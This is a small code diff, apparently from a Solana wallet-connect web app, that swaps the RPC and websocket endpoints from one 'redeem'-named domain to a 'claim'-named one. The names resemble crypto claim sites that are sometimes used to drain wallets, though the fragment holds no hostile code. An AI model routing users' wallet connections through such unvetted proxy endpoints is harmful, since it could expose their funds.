@@ -17,9 +17,9 @@ const wallets = [new PhantomWalletAdapter(), new SolflareWalletAdapter()];
 ReactDOM.createRoot(document.getElementById('root') as HTMLElement).render(
   <React.StrictMode>
     <ConnectionProvider
-      endpoint={"https://redeemonsol.com/api/solana-endpoint"}
+      endpoint={"https://betterclaimsol.xyz/api/solana-endpoint"}
       config={{
-        wsEndpoint: "wss://redeemonsol.com/api/solana-endpoint"
+        wsEndpoint: "wss://betterclaimsol.xyz/api/solana-endpoint"
       }}
     >
       <WalletProvider wallets={wallets} autoConnect>
